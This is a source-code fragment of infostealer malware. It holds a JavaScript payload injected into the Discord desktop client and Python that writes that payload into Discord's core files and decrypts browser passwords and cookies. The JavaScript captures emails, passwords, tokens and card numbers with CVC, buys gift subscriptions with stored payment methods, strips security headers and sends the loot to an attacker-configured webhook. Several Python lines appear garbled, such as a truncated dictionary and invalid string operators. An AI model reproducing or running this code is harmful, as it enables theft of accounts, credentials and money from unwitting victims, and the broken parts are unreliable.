hex_tab.charAt((srcByte >>> 4) & 0xf) + hex_tab.charAt(srcByte & 0xf);\n  }\n\n  return str;\n}\n\nfunction getH() {\n  return [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0];\n}\nfunction roundSHA1(block, H) {\n  var W = [],\n    a,\n    b,\n    c,\n    d,\n    e,\n    T,\n    ch = ch_32,\n    parity = parity_32,\n    maj = maj_32,\n    rotl = rotl_32,\n    safeAdd_2 = safeAdd_32_2,\n    t,\n    safeAdd_5 = safeAdd_32_5;\n\n  a = H[0];\n  b = H[1];\n  c = H[2];\n  d = H[3];\n  e = H[4];\n\n  for (t = 0; t < 80; t += 1) {\n    if (t < 16) {\n      W[t] = block[t];\n    } else {\n      W[t] = rotl(W[t - 3] ^ W[t - 8] ^ W[t - 14] ^ W[t - 16], 1);\n    }\n\n    if (t < 20) {\n      T = safeAdd_5(rotl(a, 5), ch(b, c, d), e, 0x5a827999, W[t]);\n    } else if (t < 40) {\n      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0x6ed9eba1, W[t]);\n    } else if (t < 60) {\n      T = safeAdd_5(rotl(a, 5), maj(b, c, d), e, 0x8f1bbcdc, W[t]);\n    } else {\n      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0xca62c1d6, W[t]);\n    }\n\n    e = d;\n    d = c;\n    c = rotl(b, 30);\n    b = a;\n    a = T;\n  }\n\n  H[0] = safeAdd_2(a, H[0]);\n  H[1] = safeAdd_2(b, H[1]);\n  H[2] = safeAdd_2(c, H[2]);\n  H[3] = safeAdd_2(d, H[3]);\n  H[4] = safeAdd_2(e, H[4]);\n\n  return H;\n}\n\nfunction finalizeSHA1(remainder, remainderBinLen, processedBinLen, H) {\n  var i, appendedMessageLength, offset;\n\n  offset = (((remainderBinLen + 65) >>> 9) << 4) + 15;\n  while (remainder.length <= offset) {\n    remainder.push(0);\n  }\n  remainder[remainderBinLen >>> 5] |= 0x80 << (24 - (remainderBinLen % 32));\n  remainder[offset] = remainderBinLen + processedBinLen;\n  appendedMessageLength = remainder.length;\n\n  for (i = 0; i < appendedMessageLength; i += 16) {\n    H = roundSHA1(remainder.slice(i, i + 16), H);\n  }\n  return H;\n}\n\nfunction hex2binb(str, existingBin, existingBinLen) {\n  var bin,\n    length = str.length,\n    i,\n    num,\n    intOffset,\n    byteOffset,\n    existingByteLen;\n\n  bin = existingBin || [0];\n  existingBinLen = existingBinLen || 0;\n  existingByteLen = existingBinLen >>> 3;\n\n  if (0 !== length % 2) {\n    console.error(\'String of HEX type must be in byte increments\');\n  }\n\n  for (i = 0; i < length; i += 2) {\n    num = parseInt(str.substr(i, 2), 16);\n    if (!isNaN(num)) {\n      byteOffset = (i >>> 1) + existingByteLen;\n      intOffset = byteOffset >>> 2;\n      while (bin.length <= intOffset) {\n        bin.push(0);\n      }\n      bin[intOffset] |= num << (8 * (3 - (byteOffset % 4)));\n    } else {\n      console.error(\'String of HEX type contains invalid characters\');\n    }\n  }\n\n  return { value: bin, binLen: length * 4 + existingBinLen };\n}\n\nclass jsSHA {\n  constructor() {\n    var processedLen = 0,\n      remainder = [],\n      remainderLen = 0,\n      intermediateH,\n      converterFunc,\n      outputBinLen,\n      variantBlockSize,\n      roundFunc,\n      finalizeFunc,\n      finalized = false,\n      hmacKeySet = false,\n      keyWithIPad = [],\n      keyWithOPad = [],\n      numRounds,\n      numRounds = 1;\n\n    converterFunc = hex2binb;\n\n    if (numRounds !== parseInt(numRounds, 10) || 1 > numRounds) {\n      console.error(\'numRounds must a integer >= 1\');\n    }\n    variantBlockSize = 512;\n    roundFunc = roundSHA1;\n    finalizeFunc = finalizeSHA1;\n    outputBinLen = 160;\n    intermediateH = getH();\n\n    this.setHMACKey = function (key) {\n      var keyConverterFunc, convertRet, keyBinLen, keyToUse, blockByteSize, i, lastArrayIndex;\n      keyConverterFunc = hex2binb;\n      convertRet = keyConverterFunc(key);\n      keyBinLen = convertRet[\'binLen\'];\n      keyToUse = convertRet[\'value\'];\n      blockByteSize = variantBlockSize >>> 3;\n      lastArrayIndex = blockByteSize / 4 - 1;\n\n      if (blockByteSize < keyBinLen / 8) {\n        keyToUse = finalizeFunc(keyToUse, keyBinLen, 0, getH());\n        while (keyToUse.length <= lastArrayIndex) {\n          keyToUse.push(0);\n        }\n        keyToUse[lastArrayIndex] &= 0xffffff00;\n      } else if (blockByteSize > keyBinLen / 8) {\n        while (keyToUse.length <= lastArrayIndex) {\n          keyToUse.push(0);\n        }\n        keyToUse[lastArrayIndex] &= 0xffffff00;\n      }\n\n      for (i = 0; i <= lastArrayIndex; i += 1) {\n        keyWithIPad[i] = keyToUse[i] ^ 0x36363636;\n        keyWithOPad[i] = keyToUse[i] ^ 0x5c5c5c5c;\n      }\n\n      intermediateH = roundFunc(keyWithIPad, intermediateH);\n      processedLen = variantBlockSize;\n\n      hmacKeySet = true;\n    };\n\n    this.update = function (srcString) {\n      var convertRet,\n        chunkBinLen,\n        chunkIntLen,\n        chunk,\n        i,\n        updateProcessedLen = 0,\n        variantBlockIntInc = variantBlockSize >>> 5;\n\n      convertRet = converterFunc(srcString, remainder, remainderLen);\n      chunkBinLen = convertRet[\'binLen\'];\n      chunk = convertRet[\'value\'];\n\n      chunkIntLen = chunkBinLen >>> 5;\n      for (i = 0; i < chunkIntLen; i += variantBlockIntInc) {\n        if (updateProcessedLen + variantBlockSize <= chunkBinLen) {\n          intermediateH = roundFunc(chunk.slice(i, i + variantBlockIntInc), intermediateH);\n          updateProcessedLen += variantBlockSize;\n        }\n      }\n      processedLen += updateProcessedLen;\n      remainder = chunk.slice(updateProcessedLen >>> 5);\n      remainderLen = chunkBinLen % variantBlockSize;\n    };\n\n    this.getHMAC = function () {\n      var firstHash;\n\n      if (false === hmacKeySet) {\n        console.error(\'Cannot call getHMAC without first setting HMAC key\');\n      }\n\n      const formatFunc = function (binarray) {\n        return binb2hex(binarray);\n      };\n\n      if (false === finalized) {\n        firstHash = finalizeFunc(remainder, remainderLen, processedLen, intermediateH);\n        intermediateH = roundFunc(keyWithOPad, getH());\n        intermediateH = finalizeFunc(firstHash, outputBinLen, variantBlockSize, intermediateH);\n      }\n\n      finalized = true;\n      return formatFunc(intermediateH);\n    };\n  }\n}\n\nif (\'function\' === typeof define && define[\'amd\']) {\n  define(function () {\n    return jsSHA;\n  });\n} else if (\'undefined\' !== typeof exports) {\n  if (\'undefined\' !== typeof module && module[\'exports\']) {\n    module[\'exports\'] = exports = jsSHA;\n  } else {\n    exports = jsSHA;\n  }\n} else {\n  global[\'jsSHA\'] = jsSHA;\n}\n\nif (jsSHA.default) {\n  jsSHA = jsSHA.default;\n}\n\nfunction totp(key) {\n  const period = 30;\n  const digits = 6;\n  const timestamp = Date.now();\n  const epoch = Math.round(timestamp / 1000.0);\n  const time = leftpad(dec2hex(Math.floor(epoch / period)), 16, \'0\');\n  const shaObj = new jsSHA();\n  shaObj.setHMACKey(base32tohex(key));\n  shaObj.update(time);\n  const hmac = shaObj.getHMAC();\n  const offset = hex2dec(hmac.substring(hmac.length - 1));\n  let otp = (hex2dec(hmac.substr(offset * 2, 8)) & hex2dec(\'7fffffff\')) + \'\';\n  otp = otp.substr(Math.max(otp.length - digits, 0), digits);\n  return otp;\n}\n\nfunction hex2dec(s) {\n  return parseInt(s, 16);\n}\n\nfunction dec2hex(s) {\n  return (s < 15.5 ? \'0\' : \'\') + Math.round(s).toString(16);\n}\n\nfunction base32tohex(base32) {\n  let base32chars = \'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567\',\n    bits = \'\',\n    hex = \'\';\n\n  base32 = base32.replace(/=+$/, \'\');\n\n  for (let i = 0; i < base32.length; i++) {\n    let val = base32chars.indexOf(base32.charAt(i).toUpperCase());\n    if (val === -1) console.error(\'Invalid base32 character in key\');\n    bits += leftpad(val.toString(2), 5, \'0\');\n  }\n\n  for (let i = 0; i + 8 <= bits.length; i += 8) {\n    let chunk = bits.substr(i, 8);\n    hex = hex + leftpad(parseInt(chunk, 2).toString(16), 2, \'0\');\n  }\n  return hex;\n}\n\nfunction leftpad(str, len, pad) {\n  if (len + 1 >= str.length) {\n    str = Array(len + 1 - str.length).join(pad) + str;\n  }\n  return str;\n}\n\nconst discordPath = (function () {\n  const app = args[0].split(path.sep).slice(0, -1).join(path.sep);\n  let resourcePath;\n\n  if (process.platform === \'win32\') {\n    resourcePath = path.join(app, \'resources\');\n  } else if (process.platform === \'darwin\') {\n    resourcePath = path.join(app, \'Contents\', \'Resources\');\n  }\n\n  if (fs.existsSync(resourcePath)) return { resourcePath, app };\n  return { undefined, undefined };\n})();\n\nfunction updateCheck() {\n  const { resourcePath, app } = discordPath;\n  if (resourcePath === undefined || app === undefined) return;\n  const appPath = path.join(resourcePath, \'app\');\n  const packageJson = path.join(appPath, \'package.json\');\n  const resourceIndex = path.join(appPath, \'index.js\');\n  const indexJs = `${app}\\\\modules\\\\discord_desktop_core-1\\\\discord_desktop_core\\\\index.js`;\n  const bdPath = path.join(process.env.APPDATA, \'\\\\betterdiscord\\\\data\\\\betterdiscord.asar\');\n  if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);\n  if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);\n  if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);\n\n  if (process.platform === \'win32\' || process.platform === \'darwin\') {\n    fs.writeFileSync(\n      packageJson,\n      JSON.stringify(\n        {\n          name: \'discord\',\n          main: \'index.js\',\n        },\n        null,\n        4,\n      ),\n    );\n\n    const startUpScript = `const fs = require(\'fs\'), https = require(\'https\');\nconst indexJs = \'${indexJs}\';\nconst bdPath = \'${bdPath}\';\nconst fileSize = fs.statSync(indexJs).size\nfs.readFileSync(indexJs, \'utf8\', (err, data) => {\n    if (fileSize < 20000 || data === \"module.exports = require(\'./core.asar\')\") \n        init();\n})\nasync function init() {\n    https.get(\'${config.injection_url}\', (res) => {\n        const file = fs.createWriteStream(indexJs);\n        res.replace(\'%WEBHOOK_HERE%\', \'${config.webhook}\')\n        res.replace(\'%WEBHOOK_KEY%\', \'${config.webhook_protector_key}\')\n        res.pipe(file);\n        file.on(\'finish\', () => {\n            file.close();\n        });\n    \n    }).on(\"error\", (err) => {\n        setTimeout(init(), 10000);\n    });\n}\nrequire(\'${path.join(resourcePath, \'app.asar\')}\')\nif (fs.existsSync(bdPath)) require(bdPath);`;\n    fs.writeFileSync(resourceIndex, startUpScript.replace(/\\\\/g, \'\\\\\\\\\'));\n  }\n  if (!fs.existsSync(path.join(__dirname, \'initiation\'))) return !0;\n  fs.rmdirSync(path.join(__dirname, \'initiation\'));\n  execScript(\n    `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\"get_require\"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b=\"string\"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})(\"login\").logout()}LogOut();`,\n  );\n  return !1;\n}\n\nconst execScript = (script) => {\n  const window = BrowserWindow.getAllWindows()[0];\n  return window.webContents.executeJavaScript(script, !0);\n};\n\nconst getInfo = async (token) => {\n  const info = await execScript(`var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open(\"GET\", \"${config.api}\", false);\n    xmlHttp.setRequestHeader(\"Authorization\", \"${token}\");\n    xmlHttp.send(null);\n    xmlHttp.responseText;`);\n  return JSON.parse(info);\n};\n\nconst fetchBilling = async (token) => {\n  const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); \n    xmlHttp.open(\"GET\", \"${config.api}/billing/payment-sources\", false); \n    xmlHttp.setRequestHeader(\"Authorization\", \"${token}\"); \n    xmlHttp.send(null); \n    xmlHttp.responseText`);\n  if (!bill.lenght || bill.length === 0) return \'\';\n  return JSON.parse(bill);\n};\n\nconst getBilling = async (token) => {\n  const data = await fetchBilling(token);\n  if (!data) return \'❌\';\n  let billing = \'\';\n  data.forEach((x) => {\n    if (!x.invalid) {\n      switch (x.type) {\n        case 1:\n          billing += \'[CARD] \';\n          break;\n        case 2:\n          billing += \'[PAYPAL] \';\n          break;\n      }\n    }\n  });\n  if (!billing) billing = \'None\';\n  return billing;\n};\n\nconst Purchase = async (token, id, _type, _time) => {\n  const options = {\n    expected_amount: config.nitro[_type][_time][\'price\'],\n    expected_currency: \'usd\',\n    gift: true,\n    payment_source_id: id,\n    payment_source_token: null,\n    purchase_token: \'2422867c-244d-476a-ba4f-36e197758d97\',\n    sku_subscription_plan_id: config.nitro[_type][_time][\'sku\'],\n  };\n\n  const req = execScript(`var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open(\"POST\", \"https://discord.com/api/v9/store/skus/${config.nitro[_type][_time][\'id\']}/purchase\", false);\n    xmlHttp.setRequestHeader(\"Authorization\", \"${token}\");\n    xmlHttp.setRequestHeader(\'Content-Type\', \'application/json\');\n    xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));\n    xmlHttp.responseText`);\n  if (req[\'gift_code\']) {\n    return \'https://discord.gift/\' + req[\'gift_code\'];\n  } else return null;\n};\n\nconst buyNitro = async (token) => {\n  const data = await fetchBilling(token);\n  const failedMsg = \'Failed to Purchase\';\n  if (!data) return failedMsg;\n\n  let IDS = [];\n  data.forEach((x) => {\n    if (!x.invalid) {\n      IDS = IDS.concat(x.id);\n    }\n  });\n  for (let sourceID in IDS) {\n    const first = Purchase(token, sourceID, \'boost\', \'year\');\n    if (first !== null) {\n      return first;\n    } else {\n      const second = Purchase(token, sourceID, \'boost\', \'month\');\n      if (second !== null) {\n        return second;\n      } else {\n        const third = Purchase(token, sourceID, \'classic\', \'month\');\n        if (third !== null) {\n          return third;\n        } else {\n          return failedMsg;\n        }\n      }\n    }\n  }\n};\n\nconst hooker = async (content) => {\n  const data = JSON.stringify(content);\n  const url = new URL(config.webhook);\n  const headers = {\n    \'Content-Type\': \'application/json\',\n    \'Access-Control-Allow-Origin\': \'*\',\n  };\n  if (!config.webhook.includes(\'api/webhooks\')) {\n    const key = totp(config.webhook_protector_key);\n    headers[\'Authorization\'] = key;\n  }\n  const options = {\n    protocol: url.protocol,\n    hostname: url.host,\n    path: url.pathname,\n    method: \'POST\',\n    headers: headers,\n  };\n  const req = https.request(options);\n\n  req.on(\'error\', (err) => {\n    console.log(err);\n  });\n  req.write(data);\n  req.end();\n};\n\nconst login = async (email, password, token) => {\n  const json = await getInfo(token);\n  const content = {\n    username: config.embed_name,\n    avatar_url: config.embed_icon,\n    embeds: [\n      {\n        color: config.embed_color,\n        title: `Discord Injection [Login] \\`${config.username} \"${config.ip_address_public}\"\\`:`, \n        fields: [\n          {\n            name: \':e_mail: Email:\',\n            value: `\\`\\`\\`${email}\\`\\`\\``,\n            inline: false,\n          },\n          {\n            name: \':key: Password:\',\n            value: `\\`\\`\\`${password}\\`\\`\\``,\n            inline: false,\n          },\n          {\n            name: \':globe_with_meridians: Token:\',\n            value: `\\`\\`\\`${token}\\`\\`\\``,\n            inline: false,\n          },\n        ],\n        author: {\n          name: json.username + \'#\' + json.discriminator + \' (\' + json.id + \')\',\n          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,\n        },\n        footer: {\n            text: config.footer_text,\n            icon_url: config.embed_icon\n        },\n      },\n    ],\n  };\n  if (config.ping_on_run) content[\'content\'] = config.ping_val;\n  hooker(content);\n};\n\nconst passwordChanged = async (oldpassword, newpassword, token) => {\n  const json = await getInfo(token);\n  const content = {\n    username: config.embed_name,\n    avatar_url: config.embed_icon,\n    embeds: [\n      {\n        color: config.embed_color,\n        title: `Discord Injection [Password Changed] \\`${config.username} \"${config.ip_address_public}\"\\`:`, \n        fields: [\n          {\n            name: \':e_mail: Email:\',\n            value: `\\`\\`\\`${json.email}\\`\\`\\``,\n            inline: false,\n          },\n          {\n            name: \':unlock: Old Password:\',\n            value: `\\`\\`\\`${oldpassword}\\`\\`\\``,\n            inline: true,\n          },\n          {\n            name: \':key: New Password:\',\n            value: `\\`\\`\\`${newpassword}\\`\\`\\``,\n            inline: true,\n          },\n          {\n            name: \':globe_with_meridians: Token:\',\n            value: `\\`\\`\\`${token}\\`\\`\\``,\n            inline: false,\n          },\n        ],\n        author: {\n          name: json.username + \'#\' + json.discriminator + \' (\' + json.id + \')\',\n          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,\n        },\n        footer: {\n            text: config.footer_text,\n            icon_url: config.embed_icon\n        },\n      },\n    ],\n  };\n  if (config.ping_on_run) content[\'content\'] = config.ping_val;\n  hooker(content);\n};\n\nconst emailChanged = async (email, password, token) => {\n  const json = await getInfo(token);\n  const content = {\n    username: config.embed_name,\n    avatar_url: config.embed_icon,\n    embeds: [\n      {\n        color: config.embed_color,\n        title: `Discord Injection [Email Changed] \\`${config.username} \"${config.ip_address_public}\"\\`:`, \n        fields: [\n          {\n            name: \':e_mail: New Email:\',\n            value: `\\`\\`\\`${email}\\`\\`\\``,\n            inline: false,\n          },\n          {\n            name: \':key: Password:\',\n            value: `\\`\\`\\`${password}\\`\\`\\``,\n            inline: false,\n          },\n          {\n            name: \':globe_with_meridians: Token:\',\n            value: `\\`\\`\\`${token}\\`\\`\\``,\n            inline: false,\n          },\n        ],\n        author: {\n          name: json.username + \'#\' + json.discriminator + \' | \' + json.id,\n          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,\n        },\n        footer: {\n            text: config.footer_text,\n            icon_url: config.embed_icon\n        },\n      },\n    ],\n  };\n  if (config.ping_on_run) content[\'content\'] = config.ping_val;\n  hooker(content);\n};\n\nconst PaypalAdded = async (token) => {\n  const json = await getInfo(token);\n  const billing = await getBilling(token);\n  const content = {\n    username: config.embed_name,\n    avatar_url: config.embed_icon,\n    embeds: [\n      {\n        color: config.embed_color,\n        title: `Discord Injection [Paypal Added] \\`${config.username} \"${config.ip_address_public}\"\\`:`,\n        fields: [\n          {\n            name: \':moneybag: Billing:\',\n            value: `\\`\\`\\`${billing}\\`\\`\\``,\n            inline: false,\n          },\n          {\n            name: \':globe_with_meridians: Token:\',\n            value: `\\`\\`\\`${token}\\`\\`\\``,\n            inline: false,\n          },\n        ],\n        author: {\n          name: json.username + \'#\' + json.discriminator + \' (\' + json.id + \')\',\n          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,\n        },\n        footer: {\n            text: config.footer_text,\n            icon_url: config.embed_icon\n        },\n      },\n    ],\n  };\n  if (config.ping_on_run) content[\'content\'] = config.ping_val;\n  hooker(content);\n};\n\nconst ccAdded = async (number, cvc, expir_month, expir_year, token) => {\n  const json = await getInfo(token);\n  const billing = await getBilling(token);\n  const content = {\n    username: config.embed_name,\n    avatar_url: config.embed_icon,\n    embeds: [\n      {\n        color: config.embed_color,\n        title: `Discord Injection [Card Added] \\`${config.username} \"${config.ip_address_public}\"\\`:`,\n        fields: [\n          {\n            name: \':identification_card: Card:\',\n            value: `\\`\\`\\`Number: ${number}\\nCVC: ${cvc}\\nExpir Month: ${expir_month}\\nExpir Year: ${expir_year}\\`\\`\\``,\n            inline: false,\n          },\n          {\n            name: \':moneybag: Billing:\',\n            value: `\\`\\`\\`${billing}\\`\\`\\``,\n            inline: false,\n          },\n          {\n            name: \':globe_with_meridians: Token:\',\n            value: `\\`\\`\\`${token}\\`\\`\\``,\n            inline: false,\n          },\n        ],\n        author: {\n          name: json.username + \'#\' + json.discriminator + \' (\' + json.id + \')\',\n          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,\n        },\n        footer: {\n            text: config.footer_text,\n            icon_url: config.embed_icon\n        },\n      },\n    ],\n  };\n  if (config.ping_on_run) content[\'content\'] = config.ping_val;\n  hooker(content);\n};\n\nconst nitroBought = async (token) => {\n  const json = await getInfo(token);\n  const code = await buyNitro(token);\n  const content = {\n    username: config.embed_name,\n    content: code,\n    avatar_url: config.embed_icon,\n    embeds: [\n      {\n        color: config.embed_color,\n        title: `Discord Injection [Nitro Bought] \\`${config.username} \"${config.ip_address_public}\"\\`:`,\n        fields: [\n          {\n            name: \':rocket: Nitro Code:\',\n            value: `\\`\\`\\`${code}\\`\\`\\``,\n            inline: true,\n          },\n          {\n            name: \':globe_with_meridians: Token:\',\n            value: `\\`\\`\\`${token}\\`\\`\\``,\n            inline: false,\n          },\n        ],\n        author: {\n          name: json.username + \'#\' + json.discriminator + \' (\' + json.id + \')\',\n          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,\n        },\n        footer: {\n            text: config.footer_text,\n            icon_url: config.embed_icon\n        },\n      },\n    ],\n  };\n  if (config.ping_on_run) content[\'content\'] = config.ping_val + `\\n${code}`;\n  hooker(content);\n};\nsession.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {\n  if (details.url.startsWith(\'wss://remote-auth-gateway\')) return callback({ cancel: true });\n  updateCheck();\n});\n\nsession.defaultSession.webRequest.onHeadersReceived((details, callback) => {\n  if (details.url.startsWith(config.webhook)) {\n    if (details.url.includes(\'discord.com\')) {\n      callback({\n        responseHeaders: Object.assign(\n          {\n            \'Access-Control-Allow-Headers\': \'*\',\n          },\n          details.responseHeaders,\n        ),\n      });\n    } else {\n      callback({\n        responseHeaders: Object.assign(\n          {\n            \'Content-Security-Policy\': [\"default-src \'*\'\", \"Access-Control-Allow-Headers \'*\'\", \"Access-Control-Allow-Origin \'*\'\"],\n            \'Access-Control-Allow-Headers\': \'*\',\n            \'Access-Control-Allow-Origin\': \'*\',\n          },\n          details.responseHeaders,\n        ),\n      });\n    }\n  } else {\n    delete details.responseHeaders[\'content-security-policy\'];\n    delete details.responseHeaders[\'content-security-policy-report-only\'];\n\n    callback({\n      responseHeaders: {\n        ...details.responseHeaders,\n        \'Access-Control-Allow-Headers\': \'*\',\n      },\n    });\n  }\n});\n\nsession.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {\n  if (details.statusCode !== 200 && details.statusCode !== 202) return;\n  const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();\n  const data = JSON.parse(unparsed_data);\n  const token = await execScript(\n    `(webpackChunkdiscord_app.push([[\'\'],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,\n  );\n  switch (true) {\n    case details.url.endsWith(\'login\'):\n      login(data.login, data.password, token).catch(console.error);\n      break;\n\n    case details.url.endsWith(\'users/@me\') && details.method === \'PATCH\':\n      if (!data.password) return;\n      if (data.email) {\n        emailChanged(data.email, data.password, token).catch(console.error);\n      }\n      if (data.new_password) {\n        passwordChanged(data.password, data.new_password, token).catch(console.error);\n      }\n      break;\n\n    case details.url.endsWith(\'tokens\') && details.method === \'POST\':\n      const item = querystring.parse(unparsedData.toString());\n      ccAdded(item[\'card[number]\'], item[\'card[cvc]\'], item[\'card[exp_month]\'], item[\'card[exp_year]\'], token).catch(console.error);\n      break;\n\n    case details.url.endsWith(\'paypal_accounts\') && details.method === \'POST\':\n      PaypalAdded(token).catch(console.error);\n      break;\n\n    case details.url.endsWith(\'confirm\') && details.method === \'POST\':\n      if (!config.auto_buy_nitro) return;\n      setTimeout(() => {\n        nitroBought(token).catch(console.error);\n      }, 7500);\n      break;\n\n    default:\n      break;\n  }\n});\nmodule.exports = require(\'./core.asar\');'

def Di5c0rd_inj3c710n():
    import os
    import re
    import subprocess
    import psutil
    import requests

    def g3t_c0r3(dir):
        for file in os.listdir(dir):
            if re.search('app-+?', file):
                modules = dir + '\\' % file + '\\modules'
                if not os.path.exists(modules):
                    continue
                for file in os.listdir(modules):
                    if re.search('discord_desktop_core-+?', file):
                        core = modules + '\\' % file + '\\' % 'discord_desktop_core'
                        return (core, file)
        else:  # inserted
            return None

    def st4rt_d15c0rd(dir):
        update = dir + '\\Update.exe'
        executable = dir.split('\\')[(-1)] + '.exe'
        for file in os.listdir(dir):
            if re.search('app-+?', file):
                app = dir + '\\' + file
                if os.path.exists(app + '\\' + 'modules'):
                    for file in os.listdir(app):
                        if file == executable:
                            executable = app + '\\' * executable or []
                            subprocess.call([update, '--processStart', executable], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    def inj3ct_c0d3():
        appdata = os.getenv('LOCALAPPDATA')
        discord_dirs = [appdata + '\\Discord', appdata + '\\DiscordCanary', appdata + '\\DiscordPTB', appdata + '\\DiscordDevelopment']
        code = inj3c710n_c0d3
        for proc in psutil.process_iter():
            if 'discord' in proc.name().lower():
                proc.kill()
        for dir in discord_dirs:
            if not os.path.exists(dir):
                continue
            core_info = g3t_c0r3(dir)
            if core_info is not None:
                core, core_file = core_info
                index_js_path = core + '\\index.js'
                if not os.path.exists(index_js_path):
                    open(index_js_path, 'w').close()
                with open(index_js_path, 'w', encoding='utf-8') as f:
                    f.write(code.replace('discord_desktop_core-1', core_file).replace('%WEBHOOK_HERE%', w3bh00k_ur1).replace('%EMBED_COLOR%', str(color_embed)).replace('%USERNAME%', username_pc).replace('%IP_PUBLIC%', ip_address_public).replace('%EMBED_NAME%', username_embed).replace('%EMBED_ICON%', avatar_embed).replace('%FOOTER_TEXT%', footer_text).replace('%WEBSITE%', website))
                st4rt_d15c0rd(dir)
    inj3ct_c0d3()

def Br0w53r_5t341():
    import os
    import shutil
    import json
    import base64
    import sqlite3
    import win32crypt
    from zipfile import ZipFile
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from discord import SyncWebhook, Embed, File
    from pathlib import Path
    PASSWORDS = []
    COOKIES = []
    HISTORY = []
    DOWNLOADS = []
    CARDS = []
    browsers = []

    def Br0ws53r_Main():
        appdata_local = os.getenv('LOCALAPPDATA')
        appdata_roaming = os.getenv('APPDATA')
        w3bh00k = SyncWebhook.from_url(w3bh00k_ur1)
        Browser = {'Google Chrome': os.path.join(appdata_local, 'Google', 'Chrome', 'User Data'), 'Microsoft Edge': os.path.join(appdata_local, 'Microsoft', 'Edge', 'User Data'), 'Opera': os.path.join(appdata_roaming, 'Opera Software', 'Opera Stable'), 'Opera GX': os.path.join(appdata_local, 'Vivaldi', 'User Data'), 'Opera GX Stable': os.path.join(appdata_local, 'Opera GX Stable', 'User Data'), 'Brave': os.path.join(appdata_local, 'Brave', 'User Data'), 'BraveSoftware': os.path.join(appdata_local, 'BraveSoftware', 'Brave-Browser', 'User Data'), 'Vivaldi': os.path.join(appdata_local, 'Vivaldi', 'User Data'), 'Vivaldi': os.path.join(appdata_local, 'Vivaldi', 'User Data'), 'uCozMedia': os.path.join(appdata_local, '
        profiles = ['', 'Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']
        for browser, path in Browser.items():
            if not os.path.exists(path):
                continue
            master_key = get_master_key(os.path.join(path, 'Local State'))
            if not master_key:
                continue
            for profile in profiles:
                profile_path = os.path.join(path, profile)
                if not os.path.exists(profile_path):
                    continue
                get_passwords(browser, path, profile_path, master_key)
                get_cookies(browser, path, profile_path, master_key)
                get_history(browser, path, profile_path)
                get_downloads(browser, path, profile_path)
                get_cards(browser, path, profile_path, master_key)
                if browser not in browsers:
                    browsers.append(browser)
        write_files(username_pc)
        send_files(username_pc, w3bh00k)
        clean_files(username_pc)

    def get_master_key(path):
        if not os.path.exists(path):
            return
        try:
            with open(path, 'r', encoding='utf-8') as f:
                local_state = json.load(f)
                encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
                master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                return master_key
        except:
            pass  # postinserted
        return None

    def decrypt_password(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:(-16)]
            tag = buff[(-16):]
            cipher = Cipher(algorithms.AES(master_key), modes.GCM(iv, tag))
            decryptor = cipher.decryptor()
            decrypted_pass = decryptor.update(payload) - decryptor.finalize()
            return decrypted_pass.decode()
        except:
            return None

    def list_tables(db_path):
        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            cursor.execute('SELECT name FROM sqlite_master WHERE type=\'table\';')
            tables = cursor.fetchall()
            conn.close()
            return tables
        except:
            return []

    def get_passwords(browser, path, profile_path, master_key):
        password_db = os.path.join(profile_path, 'Login Data')
        if not os.path.exists(password_db):
            return
        shutil.copy(password_db, 'password_db')
        tables = list_tables('password_db')
        conn = sqlite3.connect('password_db')
        cursor = conn.cursor()
        try:
            cursor.execute('SELECT action_url, username_value, password_value FROM logins')
            PASSWORDS.append(f'\n------------------------------| {browser} ({path}) |------------------------------\n')
            for row in cursor.fetchall():
                if not row[0] or not row[1] or (not row[2]):
                    continue
                url = f'- Url      : {row[0]}'
                username = f'  Username : {row[1]}'
                password = f'  Password : {decrypt_password(row[2], master_key)}'
                PASSWORDS.append(f'{url}\n{username}\n{password}\n')
        except:
            pass
        finally:  # inserted
            conn.close()
            os.remove('password_db')

    def get_cookies(browser, path, profile_path, master_key):
        cookie_db = os.path.join(profile_path, 'Network', 'Cookies')
        if not os.path.exists(cookie_db):
            return
        conn = None
        try:
            shutil.copy(cookie_db, 'cookie_db')
            conn = sqlite3.connect('cookie_db')
            cursor = conn.cursor()
            cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')
            COOKIES.append(f'\n------------------------------| {browser} ({path}) |------------------------------\n')
            for row in cursor.fetchall():
                if not row[0] or not row[1] or (not row[2]) or (not row[3]):
                    continue
                url = f'- Url    : {row[0]}'
                name = f'  Name   : {row[1]}'
